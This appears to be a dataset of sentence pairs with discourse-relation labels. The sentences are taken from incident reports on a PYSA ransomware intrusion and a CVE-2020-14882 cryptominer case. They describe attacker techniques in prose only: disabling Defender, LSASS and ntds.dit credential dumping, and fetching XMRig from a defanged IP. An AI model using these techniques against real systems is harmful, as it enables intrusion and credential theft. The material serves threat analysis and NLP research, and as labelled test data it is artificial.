        "S1": "To execute Koadic, they employed a MSHTA launcher with javascript.",
        "S2": "Persistence was setup using Koadic to schedule a task to execute a HTA file located in the C:\\ProgramData directory at logon as system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To execute Koadic, they employed a MSHTA launcher with javascript.",
        "S2": "The threat actors disabled Windows Defender using Local Group Policy Editor.",
        "relation": "MISC"
    },
    {
        "S1": "Later, they also ran a PowerShell script that would again disable Windows Defender, this time using MpPreference.",
        "S2": "A Defender exclusion was also added to exclude everything with .exe as the extension.",
        "relation": "MISC"
    },
    {
        "S1": "Later, they also ran a PowerShell script that would again disable Windows Defender, this time using MpPreference.",
        "S2": "The threat actors displayed multiple techniques for gathering credentials during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors displayed multiple techniques for gathering credentials during this intrusion.",
        "S2": "While no plain text exfiltration was seen during this intrusion, canary documents were opened by the threat actors hours after the ransom, confirming that the hours spent on network before ransoming was used to gather files.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors displayed multiple techniques for gathering credentials during this intrusion.",
        "S2": "While established on a domain controller the threat actors also created and accessed a shadow copy of the ntds.dit and most likely exfiltrated it via their Koadic C2 channel.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors were focused on the backup server for quite awhile as they dumped credentials from the 3rd party backup software repository.",
        "S2": "The threat actors also ran Invoke-Mimikatz from BC-Security on one of the domain controllers.",
        "relation": "MISC"
    },
    {
        "S1": "We also saw the threat actors save LSA Secrets to disk using the hashdump_sam module in Koadic which runs impacket.",
        "S2": "The threat actors leveraged many built-in Windows tools for discovery including the following:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors leveraged many built-in Windows tools for discovery including the following:",
        "S2": "They also reviewed a few admin tools while exploring the network including:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors also brought some tools of their own to aid in discovery tasks including Advanced Port Scanner and ADRecon.",
        "S2": "The first lateral movement occurred just 3 minutes after the initial access by the threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "Other local discovery was performed using PowerShell such as ps to list the running process on systems.",
        "S2": "After a few hours in, the threat actors decided to automate some credential collection and used PsExec to execute a PowerShell script that called comsvcs.dll for lsass dumping.",
        "relation": "NEXT"
    },
    {
        "S1": "RDP was initiated from the beachhead host to a domain controller using the valid account they had used to gain access to the first host.",
        "S2": "After a few hours in, the threat actors decided to automate some credential collection and used PsExec to execute a PowerShell script that called comsvcs.dll for lsass dumping.",
        "relation": "MISC"
    },
    {
        "S1": "After a few hours in, the threat actors decided to automate some credential collection and used PsExec to execute a PowerShell script that called comsvcs.dll for lsass dumping.",
        "S2": "Two files were dropped via RDP on each system, a PowerShell script and a PYSA ransomware executable.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors used 3 different C2 channels, RDP, PowerShell Empire, and Koadic.",
        "S2": "Since no plaintext exfil was observed we assess that the exfiltration was performed via one of the command and control channels either RDP, Empire, or Koadic.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors used 3 different C2 channels, RDP, PowerShell Empire, and Koadic.",
        "S2": "While no plain text exfiltration was seen during this intrusion, canary documents were opened by the threat actors hours after the ransom, confirming that the hours spent on network before ransoming was used to gather files.",
        "relation": "NEXT"
    },
    {
        "S1": "IP\u2019s used to maintain access over RDP",
        "S2": "The source IP\u2019s from these canary documents were also Tor exit nodes just like the RDP connections.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While no plain text exfiltration was seen during this intrusion, canary documents were opened by the threat actors hours after the ransom, confirming that the hours spent on network before ransoming was used to gather files.",
        "S2": "The purpose of the PowerShell script was to disable security tools that might not have been disabled through-out the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "While no plain text exfiltration was seen during this intrusion, canary documents were opened by the threat actors hours after the ransom, confirming that the hours spent on network before ransoming was used to gather files.",
        "S2": "Around the 7.5 hour mark the threat actors began ransom deployment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Two files were dropped via RDP on each system, a PowerShell script and a PYSA ransomware executable.",
        "S2": "Finally, the ransomware exe was executed and the systems ransomed.",
        "relation": "NEXT"
    },
    {
        "S1": "A threat actor exploited CVE-2020-14882 by making a call to the images directory, which allowed them to execute code on the server.",
        "S2": "The threat actor executed an xml file named wbw hosted at 95.142.39[.]135 by exploiting CVE-2020-14882.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A threat actor exploited CVE-2020-14882 by making a call to the images directory, which allowed them to execute code on the server.",
        "S2": "The server\u2019s CPU was maxed out at 100% and likely would have caused issues in an enterprise environment.",
        "relation": "NEXT"
    },
    {
        "S1": "Using this exploit, they downloaded and executed an xml file, which included a PowerShell command to download and execute a script.",
        "S2": "The threat actor executed an xml file named wbw hosted at 95.142.39[.]135 by exploiting CVE-2020-14882.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The script does multiple things, such as download XMRig and its config, rename XMRig to sysupdate, schedule a task for it\u2019s update process, and confirm the miner is running.",
        "S2": "The script starts off by setting parameters, such as the download locations for XMRig and its config.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the above screenshot, the threat actor executes wbw.xml which then downloads and executes 1.ps1.",
        "S2": "There was no script located in this directory but we assume one would show up when the miner needed to be updated, if the threat actor still had access.",
        "relation": "MISC"
    },
    {
        "S1": "The script then downloads and executes XMRig, renames it to sysupdate and then sets a schedule task, which runs update.ps1.",
        "S2": "The script renamed xmrig.exe to sysupdate in attempt to hide itself.",
        "relation": "ELABORATION"
    }
]